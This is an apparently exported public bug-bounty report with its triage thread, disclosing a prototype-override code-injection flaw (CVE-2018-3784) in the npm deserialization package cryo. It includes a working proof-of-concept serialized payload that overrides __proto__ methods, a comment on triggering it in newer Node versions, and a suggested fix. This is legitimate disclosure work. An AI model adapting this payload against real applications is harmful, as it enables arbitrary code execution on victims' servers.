{"id":350418,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA0MTg=","url":"https://hackerone.com/reports/350418","title":"Insecure implementation of deserialization in cryo","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-05-11T12:05:58.528Z","submitted_at":"2018-05-11T12:05:58.528Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"greendog","url":"/greendog","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2018-3784"],"singular_disclosure_disabled":false,"disclosed_at":"2018-06-19T15:51:37.020Z","bug_reporter_agreed_on_going_public_at":"2018-06-19T15:51:36.911Z","team_member_agreed_on_going_public_at":"2018-06-15T21:45:16.937Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report code injection in serialization package cryo\nIt allows execute arbitrary code using custom prototype.\n\n# Module\n\n**module name:** cryo\n**version:** 0.0.6\n**npm page:** `https://www.npmjs.com/package/cryo`\n\n## Module Description\n\nJSON on steroids.\nBuilt for node.js and browsers. Cryo is inspired by Python's pickle and works similarly to JSON.stringify() and JSON.parse(). Cryo.stringify() and Cryo.parse() improve on JSON in these circumstances:\n\n## Module Stats\n\n37 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nIf an application uses \"cryo\" package to deserialize JSON into an object and interacts with the object later in the code (convert to sting, for example) and if an attacker controls this JSON, then the attacker can get arbitrary code execution in the application.\n\nTo reconstruct an object from JSON, cryo uses square bracket notation ( `obj[key]=value` ). So there is an opportunity for an attacker to change `__proto__` property for a new object. Also Cryo supports serialization of functions, so the attacker can set their own methods (toString, valueOf) for the new object.\nIt means that if later in the code the application interacts with the new object in the way which leads to invocation of the object's prototype functions, then the attacker malicious code are executed.\n\n\n## Steps To Reproduce:\n\nPoC:\n```\nvar Cryo = require('cryo');\nvar frozen = '{\"root\":\"_CRYO_REF_3\",\"references\":[{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\"); return 1111;}\"},{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\");return 2222;}\"},{\"contents\":{\"toString\":\"_CRYO_REF_0\",\"valueOf\":\"_CRYO_REF_1\"},\"value\":\"_CRYO_OBJECT_\"},{\"contents\":{\"__proto__\":\"_CRYO_REF_2\"},\"value\":\"_CRYO_OBJECT_\"}]}'\nvar hydrated = Cryo.parse(frozen);\nconsole.log(hydrated);\n```\nconsole.log internally calls hydrated's vauleOf method, so an attacker's code are executed and we can see \"defconrussia\" in console.\n\n## Patch\n\nI suggest to blacklist \"__proto__\" property in deserialization process.\n\n## Supporting Material/References:\n\n- Ubuntu 16.04\n- node v6.11.3\n- npm 5.5.1\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n\n\u003e Hunter's comments and funny memes goes here\nAlso I found a couple of other modules (for example, https://www.npmjs.com/package/kaiser)  which use square bracket notation too, so it's possible to rewrite `__proto__` with them too. But us they don't support serialization of functions, we cannot use the same attack as described here. Still we can set wrong values for prototype's methods, so if an application tries to convert a new object (deserialized from JSON) to string, it may crash with a TypeError exception.\nIt could be a kind of DoS.  What do you think if I should create similar reports for such cases?\n\n## Impact\n\nAn attacker can craft a special JSON file with malicious code which rewrites `__proto__` of a new object. In some circumstances it may lead to execution of the code, so the attacker can achieve OS command execution.","vulnerability_information_html":"\u003cp\u003eI would like to report code injection in serialization package cryo\u003cbr\u003e\nIt allows execute arbitrary code using custom prototype.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e cryo\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.0.6\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/cryo\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eJSON on steroids.\u003cbr\u003e\nBuilt for node.js and browsers. Cryo is inspired by Python\u0026#39;s pickle and works similarly to JSON.stringify() and JSON.parse(). Cryo.stringify() and Cryo.parse() improve on JSON in these circumstances:\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e37 downloads in the last week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eIf an application uses \u0026quot;cryo\u0026quot; package to deserialize JSON into an object and interacts with the object later in the code (convert to sting, for example) and if an attacker controls this JSON, then the attacker can get arbitrary code execution in the application.\u003c/p\u003e\n\n\u003cp\u003eTo reconstruct an object from JSON, cryo uses square bracket notation ( \u003ccode\u003eobj[key]=value\u003c/code\u003e ). So there is an opportunity for an attacker to change \u003ccode\u003e__proto__\u003c/code\u003e property for a new object. Also Cryo supports serialization of functions, so the attacker can set their own methods (toString, valueOf) for the new object.\u003cbr\u003e\nIt means that if later in the code the application interacts with the new object in the way which leads to invocation of the object\u0026#39;s prototype functions, then the attacker malicious code are executed.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003ePoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evar Cryo = require(\u0026#39;cryo\u0026#39;);\nvar frozen = \u0026#39;{\u0026quot;root\u0026quot;:\u0026quot;_CRYO_REF_3\u0026quot;,\u0026quot;references\u0026quot;:[{\u0026quot;contents\u0026quot;:{},\u0026quot;value\u0026quot;:\u0026quot;_CRYO_FUNCTION_function () {console.log(\\\\\u0026quot;defconrussia\\\\\u0026quot;); return 1111;}\u0026quot;},{\u0026quot;contents\u0026quot;:{},\u0026quot;value\u0026quot;:\u0026quot;_CRYO_FUNCTION_function () {console.log(\\\\\u0026quot;defconrussia\\\\\u0026quot;);return 2222;}\u0026quot;},{\u0026quot;contents\u0026quot;:{\u0026quot;toString\u0026quot;:\u0026quot;_CRYO_REF_0\u0026quot;,\u0026quot;valueOf\u0026quot;:\u0026quot;_CRYO_REF_1\u0026quot;},\u0026quot;value\u0026quot;:\u0026quot;_CRYO_OBJECT_\u0026quot;},{\u0026quot;contents\u0026quot;:{\u0026quot;__proto__\u0026quot;:\u0026quot;_CRYO_REF_2\u0026quot;},\u0026quot;value\u0026quot;:\u0026quot;_CRYO_OBJECT_\u0026quot;}]}\u0026#39;\nvar hydrated = Cryo.parse(frozen);\nconsole.log(hydrated);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003econsole.log internally calls hydrated\u0026#39;s vauleOf method, so an attacker\u0026#39;s code are executed and we can see \u0026quot;defconrussia\u0026quot; in console.\u003c/p\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eI suggest to blacklist \u0026quot;\u003cstrong\u003eproto\u003c/strong\u003e\u0026quot; property in deserialization process.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eUbuntu 16.04\u003c/li\u003e\n\u003cli\u003enode v6.11.3\u003c/li\u003e\n\u003cli\u003enpm 5.5.1\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: N\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eHunter\u0026#39;s comments and funny memes goes here\u003cbr\u003e\nAlso I found a couple of other modules (for example, \u003ca title=\"https://www.npmjs.com/package/kaiser\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fkaiser\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/kaiser\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)  which use square bracket notation too, so it\u0026#39;s possible to rewrite \u003ccode\u003e__proto__\u003c/code\u003e with them too. But us they don\u0026#39;t support serialization of functions, we cannot use the same attack as described here. Still we can set wrong values for prototype\u0026#39;s methods, so if an application tries to convert a new object (deserialized from JSON) to string, it may crash with a TypeError exception.\u003cbr\u003e\nIt could be a kind of DoS.  What do you think if I should create similar reports for such cases?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can craft a special JSON file with malicious code which rewrites \u003ccode\u003e__proto__\u003c/code\u003e of a new object. In some circumstances it may lead to execution of the code, so the attacker can achieve OS command execution.\u003c/p\u003e\n","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-07-15T21:45:17.031Z","allow_singular_disclosure_after":-77529347.69764012,"singular_disclosure_allowed":true,"vote_count":7,"voters":["mashoud1122","bl4de","eveeez","apapedulimu","oddfuturex","cryptographer","yassine_ka"],"severity":{"rating":"high","score":8.7,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":10261,"asset_type":"SOURCE_CODE","asset_identifier":"cryo","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2767381,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @greendog,  \n\nThanks a lot for reporting the vulnerability.\nI invited the maintainers team to join the conversation and triage the issue.\n\n","markdown_message":"\u003cp\u003eHi @greendog,  \u003c/p\u003e\n\n\u003cp\u003eThanks a lot for reporting the vulnerability.\u003cbr\u003e\nI invited the maintainers team to join the conversation and triage the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-20T08:31:50.546Z","updated_at":"2018-05-20T08:31:50.546Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2767394,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-20T08:31:55.646Z","updated_at":"2018-05-20T08:31:55.646Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2767712,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-20T08:37:34.143Z","updated_at":"2018-05-20T08:37:34.143Z","additional_data":{"old_severity":"Medium","new_severity":"High (8.7)","old_severity_id":152349,"new_severity_id":156398},"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2825319,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@greendog I haven't been able to reproduce the result from the POC you provided. I just get a log output for an empty object.","markdown_message":"\u003cp\u003e\u003ca href=\"/greendog\"\u003e@greendog\u003c/a\u003e I haven\u0026#39;t been able to reproduce the result from the POC you provided. I just get a log output for an empty object.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-31T19:29:21.102Z","updated_at":"2018-05-31T19:29:21.102Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2825335,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nevermind, that's actually reproduced in earlier Node.js versions up until 8.9.4","markdown_message":"\u003cp\u003eNevermind, that\u0026#39;s actually reproduced in earlier Node.js versions up until 8.9.4\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-31T19:31:36.740Z","updated_at":"2018-05-31T19:31:36.740Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2825359,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-31T19:32:30.618Z","updated_at":"2018-05-31T19:32:30.618Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"Other module","new_scope":"cryo","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2825711,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@lirantal Do you know what has changed in the newer version? May be `__proto__` is not supported anymore?\nI need to check it.","markdown_message":"\u003cp\u003e\u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e Do you know what has changed in the newer version? May be \u003ccode\u003e__proto__\u003c/code\u003e is not supported anymore?\u003cbr\u003e\nI need to check it.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-31T19:58:40.467Z","updated_at":"2018-05-31T19:58:40.467Z","actor":{"username":"greendog","cleared":true,"url":"/greendog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2825718,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe there was a similar issue related to __proto__ handling indeed but not sure it's affecting this or not. Let me know what you come up with. ","markdown_message":"\u003cp\u003eI believe there was a similar issue related to \u003cstrong\u003eproto\u003c/strong\u003e handling indeed but not sure it\u0026#39;s affecting this or not. Let me know what you come up with. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-31T20:01:02.985Z","updated_at":"2018-05-31T20:01:02.985Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2849366,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've checked it. Actually, deserialization works in the same way in newer versions. `__proto__` is supported and accessible and it is changed after deserialization. The only difference is that `console.log(hydrated);` doesn't call `valueOf()` internally. But if there is a concatenation or something similar, then `valueOf()` is called and our code is executed. For example, `console.log(hydrated + \" - anything\");`","markdown_message":"\u003cp\u003eI\u0026#39;ve checked it. Actually, deserialization works in the same way in newer versions. \u003ccode\u003e__proto__\u003c/code\u003e is supported and accessible and it is changed after deserialization. The only difference is that \u003ccode\u003econsole.log(hydrated);\u003c/code\u003e doesn\u0026#39;t call \u003ccode\u003evalueOf()\u003c/code\u003e internally. But if there is a concatenation or something similar, then \u003ccode\u003evalueOf()\u003c/code\u003e is called and our code is executed. For example, \u003ccode\u003econsole.log(hydrated + \u0026quot; - anything\u0026quot;);\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-06T11:12:45.479Z","updated_at":"2018-06-06T11:12:45.479Z","actor":{"username":"greendog","cleared":true,"url":"/greendog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2849396,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ahh interesting.\nI opened an issue in the repo to see if we can get attention from maintainers to join the discussion. Otherwise I'll go proceed with a public disclosure.","markdown_message":"\u003cp\u003eahh interesting.\u003cbr\u003e\nI opened an issue in the repo to see if we can get attention from maintainers to join the discussion. Otherwise I\u0026#39;ll go proceed with a public disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-06T11:28:52.445Z","updated_at":"2018-06-06T11:28:52.445Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2849400,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok!\nAnd what about other modules which use square bracket notation too (look at \"Hunter's comments\" paragraph)? Do you think it's a security issue? Because I'm not sure if there is impact or not ","markdown_message":"\u003cp\u003eOk!\u003cbr\u003e\nAnd what about other modules which use square bracket notation too (look at \u0026quot;Hunter\u0026#39;s comments\u0026quot; paragraph)? Do you think it\u0026#39;s a security issue? Because I\u0026#39;m not sure if there is impact or not \u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-06T11:37:15.367Z","updated_at":"2018-06-06T11:37:15.367Z","actor":{"username":"greendog","cleared":true,"url":"/greendog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2849416,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We might end up with a lot of modules like that and it would probably fall under a category of bad coding practices than pure security so I'm not sure I'd hunt these stuff at the moment.","markdown_message":"\u003cp\u003eWe might end up with a lot of modules like that and it would probably fall under a category of bad coding practices than pure security so I\u0026#39;m not sure I\u0026#39;d hunt these stuff at the moment.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-06T11:44:30.779Z","updated_at":"2018-06-06T11:44:30.779Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2849425,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I fully agree. Btw, i'm going to write an article about that, to give more attention to `__proto__`-stuff.","markdown_message":"\u003cp\u003eI fully agree. Btw, i\u0026#39;m going to write an article about that, to give more attention to \u003ccode\u003e__proto__\u003c/code\u003e-stuff.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-06T11:47:14.510Z","updated_at":"2018-06-06T11:47:14.510Z","actor":{"username":"greendog","cleared":true,"url":"/greendog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2849476,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sounds great!\nPing me when you do and I'll do my best to share it in social media and promote awareness.","markdown_message":"\u003cp\u003eSounds great!\u003cbr\u003e\nPing me when you do and I\u0026#39;ll do my best to share it in social media and promote awareness.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-06T11:48:18.601Z","updated_at":"2018-06-06T11:48:18.601Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2891752,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Will go ahead with publishing the report due to no activity from the maintainers","markdown_message":"\u003cp\u003eWill go ahead with publishing the report due to no activity from the maintainers\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-15T21:44:45.091Z","updated_at":"2018-06-15T21:44:45.091Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"greendog","url":"/greendog"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2891755,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T21:45:16.969Z","updated_at":"2018-06-15T21:45:16.969Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2907823,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@lirantal Ok! And here is the article https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/","markdown_message":"\u003cp\u003e\u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e Ok! And here is the article \u003ca title=\"https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/\" href=\"/redirect?url=https%3A%2F%2Fwww.acunetix.com%2Fblog%2Fweb-security-zone%2Fdeserialization-vulnerabilities-attacking-deserialization-in-js%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-19T15:50:21.047Z","updated_at":"2018-06-19T15:50:21.047Z","actor":{"username":"greendog","cleared":true,"url":"/greendog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2907825,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-19T15:51:36.946Z","updated_at":"2018-06-19T15:51:36.946Z","actor":{"username":"greendog","cleared":true,"url":"/greendog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2907826,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-19T15:51:37.052Z","updated_at":"2018-06-19T15:51:37.052Z","actor":{"username":"greendog","cleared":true,"url":"/greendog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}